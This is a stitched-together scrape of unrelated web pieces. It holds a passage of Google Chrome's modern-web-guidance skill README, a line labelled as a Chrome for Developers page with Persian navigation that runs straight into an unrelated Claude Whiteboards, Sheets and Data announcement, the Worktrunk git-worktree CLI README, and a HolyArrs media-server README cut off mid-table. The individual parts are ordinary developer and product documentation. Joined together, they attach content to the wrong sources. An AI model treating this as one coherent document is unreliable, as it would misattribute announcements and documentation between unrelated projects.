**[deprioritize-background-fetches](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/deprioritize-background-fetches.md)**: Deprioritize background data fetches made with the Fetch API to prevent network contention with user-initiated requests. - **[detect-initial-visibility-state](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/detect-initial-visibility-state.md)**: Reliably determine whether a page was initially loaded in the background, even in cases where the script is loaded asynchronously after the user foregrounded the page. - **[efficient-background-processing](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/efficient-background-processing.md)**: Conserve system resources and battery life by pausing background JavaScript execution (such as `<canvas>` animations, WebGL rendering, or high-frequency WebSocket data polling) when the component is off-screen and then resume them just-in-time when they scroll back into view. - **[faster-spa-view-transitions](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/faster-spa-view-transitions.md)**: Enable faster transitions back to previously visited views in a Single-Page Application (SPA) by preserving their structural DOM state instead of destroying and rebuilding them on every navigation. - **[flicker-free-client-side-ab-testing](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/flicker-free-client-side-ab-testing.md)**: Deliver and render A/B tests, multi-variate tests, or other experiments using client-side JavaScript to alter or inject HTML, CSS, and JavaScript without the original content showing first before flickering or flashing to show the experiment content. - **[full-session-analytics](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/full-session-analytics.md)**: Reliably track analytics, Core Web Vitals, errors, and telemetry data across the user's entire page visit, and defer sending of the data until the user leaves the page. - **[identify-heavy-scripts](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/identify-heavy-scripts.md)**: Identify the scripts most responsible for long animation frames - **[identify-inp-causes](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/identify-inp-causes.md)**: Identify slow-running JavaScript and other causes of poor Interaction to Next Paint (INP) responsiveness. - **[improve-next-page-load-performance](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/improve-next-page-load-performance.md)**: Improve page load performance by prefetching or prerendering pages that the user is likely to visit next. - **[interaction-paint-timing](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/interaction-paint-timing.md)**: Measure the time it takes for user interactions and client-side navigations to render new contentful updates on screen. - **[interactions-in-complex-layouts](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/interactions-in-complex-layouts.md)**: Make interactions snappier and more responsive (reducing Interaction to Next Paint (INP) scores) by avoiding layout re-calculations in complex layouts, such as data-heavy dashboards or spreadsheet-style grids. - **[lazy-load-video-and-audio](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/lazy-load-video-and-audio.md)**: Defer downloading offscreen video and audio assets, including video poster images and preloaded media data, until the media player approaches the viewport to conserve bandwidth and reduce network contention during initial page load. - **[optimize-image-priority](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/optimize-image-priority.md)**: Optimize the loading priority of Largest Contentful Paint (LCP) candidate images and deprioritize non-critical images to reduce critical resource load delays. - **[optimize-preload-priority](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/optimize-preload-priority.md)**: Optimize the relative priority of preloaded content to reduce critical resource load delays. - **[optimize-script-priority](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/optimize-script-priority.md)**: Optimize the loading priority of scripts by boosting critical asynchronous scripts and deprioritizing non-essential or late-body scripts to improve sequencing and reduce delays. - **[out-of-order-html-streaming](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/out-of-order-html-streaming.md)**: Declaratively update a page with content streamed later into the same HTML document or via imperative JavaScript APIs. - **[resolution-optimized-pseudo-elements](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/resolution-optimized-pseudo-elements.md)**: Use resolution-optimized images in CSS pseudo-elements (such as `::before` and `::after`) to reduce the number of DOM nodes. - **[schedule-tasks-by-priority](https://github.com/GoogleChrome/modern-web-guidance/blob/main/skills/modern-web-guidance/guides/performance/schedule-tasks-by-priority.md)**: Schedule tasks with different priorities to ensure critical work runs first while background work is deferred.

### Safe Adoption of Modern Features * **Progressive Enhancement & Nuanced Fallbacks**: We distinguish between purely additive enhancements (like speculative preloading) which are safe to let older browsers silently ignore, and critical behaviors (like dialog controls or network beacons) where we write highly considered, low-overhead fallbacks. * **Responsible Fallbacks**: We prioritize lightweight, case-specific custom fallbacks (<50 LOC) or conditionally-loaded polyfills instead of heavy third-party bundles. * **Gotchas & Quirks**: We document hidden platform limitations, such as the 64KB payload quota for `fetchLater()` or macOS-specific scrollbar behaviors. * **Baseline-Aware Integration**: We leverage real-time compatibility data from the **Baseline** project so agents dynamically adapt to current browser support. * **Origin Trial & Volatile Feature Gates**: Guides covering experimental **Origin Trial** APIs or **volatile features** (single-engine features shipped within the last 3 months or still stabilizing) remain discoverable via `search`, but are gated on `retrieve` so agents do not adopt unstable APIs without explicit developer consent. ### Project Configuration (`.mwgrc`) Configure Origin Trial and volatile feature opt-ins for a repository with an optional `.mwgrc` JSON file in your project root (or `~/.mwgrc` as a user-level fallback), which you can commit to share across your team: | CLI Command | `.mwgrc` Key | Effect | | :--- | :--- | :--- | | `npx modern-web-guidance@latest set-allow-origin-trials` | `"allowOriginTrials": true` | Unlocks guides for experimental Origin Trial APIs. | | `npx modern-web-guidance@latest set-allow-volatile-features` | `"allowVolatileFeatures": true` | Unlocks guides for volatile single-engine features. | ## How It Works 1. **Activation**: The coding agent activates the `modern-web-guidance` skill because of a relevant task. The agent is instructed to use the `modern-web-guidance` CLI for web platform queries. 2. **Local Semantic Search**: The agent runs `modern-web-guidance search ""`. The tool matches the query to the best guide using an offline, zero-dependency embedding model and BM25 search engine (no network calls, no API keys). 3. **Guide Fetch**: The agent retrieves the guide via `modern-web-guidance retrieve `, inserting targeted code patterns, gotchas, and fallbacks directly into its context window. > [!TIP] > Note: We use `npx` to ensure the content doesn't go stale, but the CLI works offline, completely private and local. > The npm package is self-contained, with no extra dependencies to ensure both low-latency and supply-chain security. ## Alternative Installation Methods
Vercel Skills CLI (aka npx skills) ```shell npx skills add GoogleChrome/modern-web-guidance ```
GitHub CLI ```shell gh skill install GoogleChrome/modern-web-guidance ```
Google Antigravity ```shell agy plugin install https://github.com/GoogleChrome/modern-web-guidance ```
GitHub Copilot CLI ```shell /plugin marketplace add GoogleChrome/modern-web-guidance /plugin install modern-web-guidance@googlechrome ```
Claude Code Plugin ```shell /plugin marketplace add GoogleChrome/modern-web-guidance /plugin install modern-web-guidance@googlechrome /plugin # Select GoogleChrome marketplace, press enter, enable AutoUpdate /reload-plugins ```
Grok Build CLI ```shell grok plugin install https://github.com/GoogleChrome/modern-web-guidance --trust ```
Kimi Code ```shell /plugins install https://github.com/GoogleChrome/modern-web-guidance ```
OpenAI Codex ```shell codex plugin marketplace add GoogleChrome/modern-web-guidance codex plugin add modern-web-guidance@googlechrome ```
## Updating If you installed the skill using `npx modern-web-guidance@latest install`, you can update with: `npx modern-web-guidance@latest update`. Otherwise, consult your agent's documentation for updating plugins and skills. ## Evals to prove this works well We developed a robust eval harness to ensure that the content is **empirically proven and continuously calibrated** so AI agents write better code. We run automated evaluations using a closed-loop validation pipeline: ``` [ Expert-authored guidance and demo ] │ ▼ [ Target generation ] ──> Tasks on real webapps, Golden solutions, Playwright graders │ ▼ [ Calibration loop ] ───> Runs Grader on Golden Solutions (Must Pass 100%) │ Runs Grader on Unmodified Base App (Must Fail 100%) ▼ [ E2E agent evals ] ────> Runs coding agents in guided vs. unguided modes Compares pass rates and accessibility w/ and w/o the skill ``` 1. **Simulated Developer Tasks**: We define realistic developer prompts against full base applications (`daily-grind`, `devtools-times`) that mimic real-world requests (e.g., "make my images load faster"). Prompts avoid naming APIs or features, testing whether the agent can naturally discover and apply the right guides. 2. **Static & Browser-Based Assertions**: Playwright graders verify that each implementation requirement was followed—checking source patterns, computed styles, runtime DOM behaviors, and accessibility states. 3. **Self-Healing Calibration**: Graders are calibrated against multi-agent (Claude/Codex/AGY) golden solutions (100% pass target) and an unmodified baseline application (0% pass target). 4. **E2E Testing**: We measure coding agent performance on real tasks with and without guidance. The _opportunity_ (100% - unguided pass rate) and _uplift_ (guided - unguided pass rate) are key: if models already succeed without guidance, we prune redundant advice; where agents struggle, we refine guides to maximize uplift. ### Recent eval results snapshot Explore full per-agent and per-guide breakdowns on the **[Eval Dashboard](https://googlechrome.github.io/modern-web-guidance-src/)**. | Date | Agent + Model | Tasks / Assertions | Unguided → Guided (Uplift) | | :--- | :--- | :---: | :---: | | Nov 8 | antigravity_cli (gemini-4-argon) | 214 / 1673 | 58% → 94% (**+36pp**) | | Nov 8 | codex_cli (gpt-6.1-sol) | 215 / 1795 | 54% → 82% (**+28pp**) | | Nov 8 | claude_code (opus-5-5) | 215 / 1801 | 57% → 88% (**+31pp**) | | Nov 6 | codex_cli (gpt-6.1-sol) | 212 / 1773 | 53% → 86% (**+33pp**) | | Nov 6 | claude_code (opus-5-5) | 212 / 1773 | 56% → 90% (**+34pp**) | | Nov 6 | antigravity_cli (gemini-4-argon) | 212 / 1722 | 60% → 96% (**+36pp**) | | Nov 4 | codex_cli (gpt-6.1-sol) | 209 / 1743 | 52% → 85% (**+33pp**) | | Nov 4 | claude_code (opus-5-5) | 209 / 1743 | 57% → 90% (**+33pp**) | | Nov 4 | antigravity_cli (gemini-4-argon) | 207 / 1722 | 60% → 96% (**+36pp**) | | Nov 2 | codex_cli (gpt-6.1-sol) | 205 / 1729 | 55% → 82% (**+27pp**) | ## Available Skill Packs You can customize which skill packs are installed using the `--choose` flag: ```shell npx modern-web-guidance@latest install --choose ``` * **`modern-web-guidance`** (~205 tokens): Comprehensive guidance on modern browser APIs, layouts, and performance. * **`chrome-extensions`** (~175 tokens): Guidance on Manifest V3, background workers, extension APIs, and Chrome Web Store publishing. ## Telemetry & Privacy Google collects anonymous usage information to improve the tool's reliability, relevance, and performance. Collected information includes installation counts, the calling agent name, guide retrieval IDs, and CLI tool search queries generated by the agent (e.g. "dark mode scrollbar color-scheme"). Raw user prompts are not collected. You can inspect what is collected in [modern-web.ts](https://github.com/GoogleChrome/modern-web-guidance-src/blob/main/src/cli/modern-web.ts). > [!TIP] > **To Opt-Out:** set the `DISABLE_TELEMETRY=1` env variable in your shell profile (e.g., `.bashrc` or `.zshrc`): > ```bash > export DISABLE_TELEMETRY=1 > ``` Google handles this data in accordance with the [Google Privacy Policy](https://policies.google.com/privacy). ## Contributors Found a bug, outdated pattern, or missing web platform feature? page:https://developer.chrome.com/docs/m.text: Modern Web Guidance | Chrome for Developers رد شدن و رفتن به محتوای اصلی سندنگار ساختن با Chrome با نحوه عملکرد Chrome آشنا شوید، در آزمایش‌های مبدأ شرکت کنید، و در همه‌جا با Chrome بسازید. پلاتفرم وب برنامه‌های وب مجزا (IWA) قابلیت‌ها خودکارسازی و آزمایش ChromeDriver Extensions Chrome Web Store Chromium وب در Android آزمایش‌های معرفی ویژگی جدید یادداشت‌های انتشار بهره وری با بهترین ابزارهای وب، بهترین تجربه را برای کاربران خود ایجاد کنید. Category Product updates Product Claude apps Date November 10, 2026 Reading time 6 min Share Copy link Contents Claude Whiteboards Claude Sheets Claude Data Work in your other tools, too Getting started Today we’re launching Claude Whiteboards and Claude Sheets in beta, and Claude Dashboards (opens in new tab) becomes generally available as Claude Data. Whiteboards is a shared board where your team brainstorms with Claude, Sheets is a spreadsheet Claude builds and edits with you, and Claude Data adds data stories, certified queries, and live sharing. These are available on all paid plans. Working with Claude on a project often meant moving the output over to another tool or program, where Claude didn’t have live access to follow progress and changes. Now, your documents, boards, sheets, and dashboards can stay in Claude, with access for your team to continue editing together. When ready, you can bring the outputs directly into tools from our partners and continue working there. Claude Whiteboards Many people use Claude as a thought partner, but brainstorming with it has typically meant copy-pasting the results elsewhere so you can then start brainstorming or collaborating with your coworkers. Now, you can talk through a messy plan out loud with Claude, and Claude can turn it into a board with a timeline with owners and dates, so you and your team can collaborate in real time. In a retro meeting, for example, everyone can add their notes, and Claude can group them by theme and draft the action items for each person. You can focus on any part of the board by dragging a box around it and asking Claude questions. When you’re done brainstorming, Claude can turn the board into a doc or deck, or bring it into tools like Lucid, Miro, or Vani by Zoho, where you can continue working on it with your team. Claude Sheets Claude can now generate spreadsheets with tabs, formulas, formatting, and drop-downs, often from just a prompt like asking for a campaign tracker or a hiring budget. It can edit in the cells, outlining each new edit so you can track changes. You can share sheets with your team, so you and Claude can work on them together. For now, sheets have simple spreadsheet functionality, but we are working on adding more. When you need the full functionality of Excel, you can export your file to .xlsx or CSV, or use Claude for Excel (opens in new tab) . You can also continue working in partner tools including Airtable, Asana, monday.com, and Smartsheet. Claude Data Claude Dashboards (opens in new tab) launched in beta in October, enabling teams to ask quick questions of their company’s data in tools like Amazon Redshift, BigQuery, and ClickHouse. Starting today, it’s generally available as Claude Data. We changed the name because the way companies use their data is broader than dashboards, and the product now covers how they work more broadly. Certified queries and live sharing are in beta. Here are some ways teams can use Claude Data: Create certified definitions of metrics. Your data team can certify the queries everyone should use, so you don’t end up building or working on dashboards with conflicting data. Charts built on these metrics carry a "certified" badge showing they’re certified. Craft stories from data. You can work with Claude in Claude Data to draft data stories or narrated videos from your metrics, for you to review before sharing. Share current numbers with everyone. With live sharing, your colleagues can see up-to-date numbers when they open a shared dashboard, even if they don’t have access to the connectors that keep that data current. Viewers see the results of the queries you’ve approved, and can’t run others with your access. Match your look-and-feel. Design systems are now supported in Claude Data. Get faster loading with caching. Previously, every dashboard would reload on every load. Now, dashboards support caching, and refresh cadences can be set on a per-dashboard basis. Track changes over time. Claude Data now has tracked changes, so you can see who has made edits and roll back to a specific version if needed. Our partners for Claude Data include Amplitude, Mixpanel, Omni, PostHog, and Sigma. Work in your other tools, too Starting today, interactive connectors (opens in new tab) can open as full apps beside your conversation or in full screen, so you can work in tools like Adobe, Atlassian, Box, and Notion yourself, or ask Claude to make changes with you. Getting started Claude Whiteboards, Sheets, and Data work on web, desktop, and mobile. Claude Data needs a data connector, such as a warehouse or CRM. For admins: On Team plans, all three are on by default. On Enterprise plans, Claude Whiteboards and Sheets are off by default, and Claude Data turns on by default on November 19, 2026. You can change these anytime in Organization settings > Artifacts. Related articles Explore more product news and best practices for teams building with Claude. [![Docs](https://img.shields.io/badge/docs-worktrunk.dev-blue?style=for-the-badge&logo=gitbook)](https://worktrunk.dev) [![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue?style=for-the-badge)](https://opensource.org/licenses/MIT) [![CI](https://img.shields.io/github/actions/workflow/status/max-sixty/worktrunk/ci.yaml?event=push&branch=main&style=for-the-badge&logo=github)](https://github.com/max-sixty/worktrunk/actions?query=branch%3Amain+workflow%3Aci) [![Codecov](https://img.shields.io/codecov/c/github/max-sixty/worktrunk?style=for-the-badge&logo=codecov)](https://codecov.io/gh/max-sixty/worktrunk) [![Stars](https://img.shields.io/github/stars/max-sixty/worktrunk?style=for-the-badge&logo=github)](https://github.com/max-sixty/worktrunk/stargazers) [![maintained with tend](https://img.shields.io/badge/maintained_with-tend-bba580?style=for-the-badge&logo=data:image/svg%2bxml;base64,)](https://github.com/max-sixty/tend) > **November 2026**: Worktrunk was [released](https://x.com/max_sixty/status/2006077845391724739?s=20) at the start of the year, and has quickly become the most popular git worktree manager. It's built with love (there's no slop!). Please let me know any frictions at all; I'm intensely focused on continuing to make Worktrunk excellent, and the biggest help is folks posting problems they perceive. Worktrunk is a CLI for git worktree management, designed for running AI agents in parallel. Worktrunk's three core commands make worktrees as easy as branches. Plus, Worktrunk has a bunch of quality-of-life features to simplify working with many parallel changes, including hooks to automate local workflows & copy-on-write build caches. A quick demo: ![Worktrunk Demo](https://cdn.jsdelivr.net/gh/max-sixty/worktrunk-assets@main/assets/docs/light/wt-core.gif) > ### 📚 Full documentation at [worktrunk.dev](https://worktrunk.dev) 📚 ## Context: git worktrees AI agents like Claude Code and Codex can handle longer tasks without supervision, such that it's possible to manage 5-10+ in parallel. Git's native worktree feature gives each agent its own working directory, so they don't step on each other's changes. But the git worktree UX is clunky. Even a task as small as starting a new worktree requires typing the branch name three times: `git worktree add -b feat ../repo.feat`, then `cd ../repo.feat`. ## Worktrunk makes git worktrees as easy as branches Worktrees are addressed by branch name; paths are computed from a configurable template. Commands that take a branch also accept the path of the worktree it is checked out in.

Start with the core commands

**Core commands:**
Task Worktrunk Plain git
Switch worktrees wt switch feat cd ../repo.feat
Create + start Claude wt switch -c -x claude feat 
git worktree add -b feat ../repo.feat && \
cd ../repo.feat && \
claude
Clean up wt remove 
cd ../repo && \
git worktree remove ../repo.feat && \
git branch -d feat
List with status wt list git worktree list (paths only)

Expand into the more advanced commands as needed

Workflow automation:

- **[Hooks](https://worktrunk.dev/hook/)** — run commands on create, pre-merge, post-merge, etc - **[LLM commit messages](https://worktrunk.dev/llm-commits/)** — generate commit messages from diffs - **[Merge workflow](https://worktrunk.dev/merge/)** — squash, rebase, merge, clean up in one command - **[Interactive picker](https://worktrunk.dev/switch/#interactive-picker)** — browse worktrees with streaming CI status and diff, log, PR and comment previews - **[Share build caches](https://worktrunk.dev/step/#wt-step-copy-ignored)** — ten worktrees get `target/`, `node_modules/`, etc without building or copying them (on APFS, btrfs, and XFS) - **[`wt list --full`](https://worktrunk.dev/list/#full-mode)** — [CI status](https://worktrunk.dev/list/#ci-status) and [AI-generated summaries](https://worktrunk.dev/list/#llm-summaries) per branch - **[PR checkout](https://worktrunk.dev/switch/#pull-requests-and-merge-requests)** — `wt switch pr:123` to jump straight to a PR's branch - **[Dev server per worktree](https://worktrunk.dev/tips-patterns/#dev-server-per-worktree)** — `hash_port` template filter gives each worktree a unique port - **[Aliases](https://worktrunk.dev/extending/#aliases) & [per-branch variables](https://worktrunk.dev/config/#wt-config-state-vars)** — custom `wt ` commands and branch-scoped state for hook templates - ...and **[lots more](#next-steps)** Multiple parallel agents, same simple commands: ![Worktrunk omnibus demo: multiple Claude agents in Zellij tabs with hooks, LLM commits, and merge workflow](https://raw.githubusercontent.com/max-sixty/worktrunk-assets/main/assets/docs/light/wt-zellij-omnibus.gif) ## Install **Homebrew (macOS & Linux):** ```bash brew install worktrunk && wt config shell install ``` Shell integration allows commands to change directories. **Cargo:** ```bash cargo install worktrunk && wt config shell install ```
Windows & other **Windows.** `wt` defaults to Windows Terminal's command, so Winget additionally installs Worktrunk as `git-wt` to avoid the conflict: ```bash winget install max-sixty.worktrunk git-wt config shell install ``` Alternatively, disable Windows Terminal's alias (Settings → Apps → Advanced app settings → App execution aliases → "Terminal"/"Terminal Preview") to use `wt` directly. > Free code signing provided by [SignPath.io](https://signpath.io/), certificate by [SignPath Foundation](https://signpath.org/) — [policy](https://worktrunk.dev/code-signing/). **Arch Linux:** ```bash sudo pacman -S worktrunk && wt config shell install ``` **Conda / Pixi** (community-maintained [feedstock](https://github.com/conda-forge/worktrunk-feedstock)): ```bash conda install -c conda-forge worktrunk && wt config shell install ``` Or with [Pixi](https://pixi.sh): `pixi global install worktrunk && wt config shell install`.
## Quick start Create a worktree for a new feature: ```console $ wt switch --create feature-auth ✓ Created branch feature-auth from main and worktree @ ~/repo.feature-auth ``` This creates a new branch and worktree, then switches to it. Do your work, then check all worktrees with [`wt list`](https://worktrunk.dev/list/): ```console $ wt list Branch Status @± ^↕ ^…± Remote⇅ Commit Age Message @ feature-auth + ↑ +27 -8 ↑1 +31 4bc72dc 2h Add authenticatio… ^ main ^⇡ ⇡1 0e631ad 1d Initial commit ○ Showing 2 worktrees, 1 with changes, 1 ahead, hidden: Path ``` The `@` marks the current worktree. `+` means staged changes, `↑1` means 1 commit ahead of main, `⇡` means unpushed commits. When done, either: **PR workflow** — commit, push, open a PR, merge via GitHub/GitLab, then clean up: ```bash wt step commit # commit staged changes gh pr create # or glab mr create wt remove # after PR is merged ``` **Local merge** — squash, rebase onto main, fast-forward merge, clean up: ```console $ wt merge main ◎ Generating commit message and committing changes... (2 files, +53, no squashing needed) Add authentication module ✓ Committed changes @ a1b2c3d ◎ Merging 1 commit to main @ a1b2c3d (no rebase needed) * a1b2c3d Add authentication module auth.rs | 51 +++++++++++++++++++++++++++++++++++++++++++++++++++ lib.rs | 2 ++ 2 files changed, 53 insertions(+) ✓ Merged to main (1 commit, 2 files, +53) ◎ Removing feature-auth worktree & branch in background (same commit as main, _) ○ Switched to worktree for main @ ~/repo ``` For parallel agents, create multiple worktrees and launch an agent in each: ```bash wt switch -x claude -c feature-a -- 'Add user authentication' wt switch -x claude -c feature-b -- 'Fix the pagination bug' wt switch -x claude -c feature-c -- 'Write tests for the API' ``` The `-x` flag runs a command after switching; arguments after `--` are passed to it. Configure [post-start hooks](https://worktrunk.dev/hook/#hook-types) to automate setup (install deps, start dev servers). ## Next steps - Learn the core commands: [`wt switch`](https://worktrunk.dev/switch/), [`wt list`](https://worktrunk.dev/list/), [`wt merge`](https://worktrunk.dev/merge/), [`wt remove`](https://worktrunk.dev/remove/) - Set up [hooks](https://worktrunk.dev/hook/) for automated setup - Explore [LLM commit messages](https://worktrunk.dev/llm-commits/), [interactive picker](https://worktrunk.dev/switch/#interactive-picker), [Claude Code integration](https://worktrunk.dev/claude-code/), [CI status & PR links](https://worktrunk.dev/list/#ci-status) - Browse [tips & patterns](https://worktrunk.dev/tips-patterns/) for recipes: aliases, dev servers, databases, agent handoffs, and more - [Extending Worktrunk](https://worktrunk.dev/extending/) — customize workflows with hooks & aliases - Watch [@DevOpsToolbox's video on Worktrunk](https://youtu.be/WBQiqr6LevQ?t=345) - Run `wt --help` or `wt --help` for quick CLI reference ## Contributing - ⭐ Star the repo - Tell a friend about Worktrunk - [Open an issue](https://github.com/max-sixty/worktrunk/issues/new?title=&body=%23%23%20Description%0A%0A%3C!--%20Describe%20the%20bug%20or%20feature%20request%20--%3E%0A%0A%23%23%20Context%0A%0A%3C!--%20Any%20relevant%20context%3A%20your%20workflow%2C%20what%20you%20were%20trying%20to%20do%2C%20etc.%20--%3E) — feedback, feature requests, even a small friction or imperfect user message, or [a worktree pain not yet solved](https://github.com/max-sixty/worktrunk/issues/new?title=Worktree%20friction%3A%20&body=%23%23%20The%20friction%0A%0A%3C!--%20What%20worktree-related%20task%20is%20still%20painful%3F%20--%3E%0A%0A%23%23%20Current%20workaround%0A%0A%3C!--%20How%20do%20you%20handle%20this%20today%3F%20--%3E%0A%0A%23%23%20Ideal%20solution%0A%0A%3C!--%20What%20would%20make%20this%20easier%3F%20--%3E) - Share: [X](https://twitter.com/intent/tweet?text=Worktrunk%20%E2%80%94%20CLI%20for%20git%20worktree%20management&url=https%3A%2F%2Fworktrunk.dev) · [Reddit](https://www.reddit.com/submit?url=https%3A%2F%2Fworktrunk.dev&title=Worktrunk%20%E2%80%94%20CLI%20for%20git%20worktree%20management) · [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fworktrunk.dev) > ### 📚 Full documentation at [worktrunk.dev](https://worktrunk.dev) 📚 ### Star history

English · 简体中文 · हिन्दी · Español · Français · العربية · Português · Русский · 日本語 · Deutsch · 한국어 · Italiano · Polski · Nederlands · Türkçe · Українська

    

Six apps to watch a show. Now it's one.

HolyArrs is one self-hosted app for your shows, movies and music.
Browse like a streaming app, ask for what you want, and it handles the rest.

About 15 MB to download · about 140 MB of RAM idle with 10,000 titles · amd64, arm64, armv7
The six apps it replaces download 718.2 MB together.

Quick start · Why · What it does · Moving from other apps · The manual · Help

## 🚀 Running in two minutes Save this as `docker-compose.yml` in a new folder on a local disk: ```yaml name: holyarrs services: holyarrs: image: holyarrs/holyarrs:latest container_name: holyarrs environment: - PUID=1000 - PGID=1000 - TZ=America/New_York volumes: - /your/local/path:/config - /path/to/movies:/movies #optional - /path/to/tv:/tv #optional - /path/to/music:/music #optional - /path/to/downloads:/downloads #optional ports: - 6262:6262 restart: unless-stopped ``` ```sh docker compose up -d ``` Open `http://your-server:6262` and make the owner account. A short setup walks you through folders, a downloader and a Source. No API keys to hunt down. No second container. Every setting is explained in [the manual](#manual) further down. ## 💡 Why I built it A normal media server runs six apps: Sonarr, Radarr, Lidarr, Bazarr, Prowlarr and Seerr. That's six logins, six ports, six update cycles and six API keys to copy between them. When a show doesn't land, you check six places to find out why. I wanted one app. One login, one port, one place to look. So I built it. | App | Download (amd64) | Idle RAM | Logins | Web ports | |---|---|---|---|---| | Sonarr | 87.9 MB | | 1 | 1 | | Radarr | 91.0 MB | | 1 | 1 | | Lidarr | 121.3 MB | | 1 | 1 | | Prowlarr | 80.8 MB | | 1 | 1 | | Bazarr | 156.4 MB | | 1 | 1 | | Overseerr | 180.8 MB | | 1 | 1 | | **Six together** | **718.2 MB** | | **6** | **6** | | **HolyArrs** | **14.9 MB** | **~140 MiB** | **1** | **1 (6262)** | About 48 times smaller. Compressed registry download, linuxserver.io images, amd64, measured 2026-11-08. Idle RAM measured with 10,000 titles and 55,000 movies and episodes. ## 🎬 Ask for a title, and it shows up in your library Someone asks for a title. HolyArrs searches your Sources, picks the best release with your Pick rules, sends it to your downloader and files it in your library. Your media server hears about it when it lands. | | | |---|---| | 🍿 **Explore** | Browse like a streaming app. Hover a title and the trailer plays. | | 🙋 **Requests** | A whole show or one season. You approve, or let trusted people skip the queue. | | 🎯 **Pick rules** | You decide which release wins: size, quality, language. | | 💬 **Subtitles** | In the languages you pick, kept with the file. Finding them online comes after 1.0. | | 📅 **Calendar** | What's airing next for everything you follow. | | 🚚 **Move your setup** | From Sonarr, Radarr, Lidarr, Prowlarr, Bazarr, Seerr, Overseerr, qBittorrent and SABnzbd. Try it first, undo it later. | | 🔌 **Old-app API** | Prowlarr can keep pushing Sources to HolyArrs once you turn it on. | | 🗝️ **No API keys needed** | Titles, artwork and charts come from the HolyArrs metadata server. | | 🔒 **Encrypted keys** | Stored passwords and keys are locked with a master key that lives in your config folder. | | 🪶 **Tiny** | An image of about 15 MB with nothing but HolyArrs inside. |
See every page in motion

Home · Everything waiting on you, at a glance.
Title page · Trailer, cast and one button to ask.

Requests · Approve what friends and family ask for.
Downloads · Every grab, live, in one table.
## 🤝 It works with what you already run - **Downloaders:** qBittorrent, Transmission, Deluge, SABnzbd, NZBGet - **Media servers:** Plex, Jellyfin, Emby - **Sources:** any Torznab or Newznab indexer, or Prowlarr or Jackett - **Moves your setup from:** Sonarr, Radarr, Lidarr, Prowlarr, Bazarr, Seerr, Overseerr, qBittorrent, SABnzbd ## 🚚 Bring your old setup with you Open **Settings > Move from other apps**, add each old app's address and API key (or a backup zip), pick what comes over, run **Try it**, then **Move**. You can undo a move later. | From | What comes over | |---|---| | Sonarr, Radarr, Lidarr | Library folders, titles, quality profiles as Pick rules, exclusions, naming, indexers and download clients | | Prowlarr | Indexers as Sources | | Bazarr | Default subtitle languages | | Seerr, Overseerr | People and their waiting or approved requests | | qBittorrent, SABnzbd | Downloaders | HolyArrs only reads your old apps and changes nothing in them, so you can run both side by side until you trust it. Keys and passwords stay behind; you type them in again or import them from a file. Custom formats, tags and history don't come over. Media files never move. Step by step: [Move from other apps](https://docs.HolyArrs.com/migrate/). ## 🧭 What it doesn't do yet - **Downloading by itself.** HolyArrs connects to qBittorrent, SABnzbd and the others. It doesn't replace them. - **AI or MCP features.** Not in 1.0. - **Phone and TV apps.** Not built. The web app works on a phone. - **Music in Explore** is still being built. What's next is on the [roadmap](https://holyarrs.com/roadmap/). You vote, I build. Post ideas on [r/HolyArrs](https://reddit.com/r/HolyArrs). ## ❓ Questions people ask first **Do I keep qBittorrent or SABnzbd?** Yes, for now. HolyArrs connects to the downloader you already run. A built-in downloader is planned for a later release. **Can Sonarr and Radarr keep running while I try it?** Yes. HolyArrs reads them once and never changes them. **Is it free?** Yes. It's free and open source. --- # 📖 The manual Everything below is reference. The full guides live at [docs.HolyArrs.com](https://docs.HolyArrs.com). ## Supported architectures Pulling `holyarrs/holyarrs:latest` gets the right image for your machine. | Architecture | Available | Runs on | | :----: | :----: | --- | | amd64 | ✅ | Most PCs, servers and NAS boxes | | arm64 | ✅ | Apple silicon, newer Raspberry Pis, ARM servers | | armv7 | ✅ | Older 32-bit ARM boards | On a NAS? See [Unraid, Synology and other NAS boxes](https://docs.HolyArrs.com/run/platforms/). ## Version tags Images live on Docker Hub as [`holyarrs/holyarrs`](https://hub.docker.com/r/holyarrs/holyarrs). | Tag | Use it for | | :----: | --- | | `latest` | The newest release. | | `1.0.16` | One exact version. It never moves. | ## Usage ### docker compose (recommended) ```yaml name: holyarrs services: holyarrs: image: holyarrs/holyarrs:latest container_name: holyarrs environment: - PUID=1000 - PGID=1000 - TZ=America/New_York volumes: - /your/local/path:/config - /path/to/movies:/movies #optional - /path/to/tv:/tv #optional - /path/to/music:/music #optional - /path/to/downloads:/downloads #optional ports: - 6262:6262 restart: unless-stopped ``` ### docker cli ```sh docker run -d \ --name=holyarrs \ -e PUID=1000 \ -e PGID=1000 \ -e TZ=America/New_York \ -p 6262:6262 \ -v /your/local/path:/config \ -v /path/to/movies:/movies `#optional` \ -v /path/to/tv:/tv `#optional` \ -v /path/to/music:/music `#optional` \ -v /path/to/downloads:/downloads `#optional` \ --restart unless-stopped \ holyarrs/holyarrs:latest ``` Container settings go in compose. Everything else is set in the app. ## Parameters Each one is written `:`. Change the left side only. | Parameter | Function | | :----: | --- | | `-p 6262:6262` | The web app. | | `-e PUID=1000` | The user HolyArrs runs as. See [User and group](#user-and-group). | | `-e PGID=1000` | The group 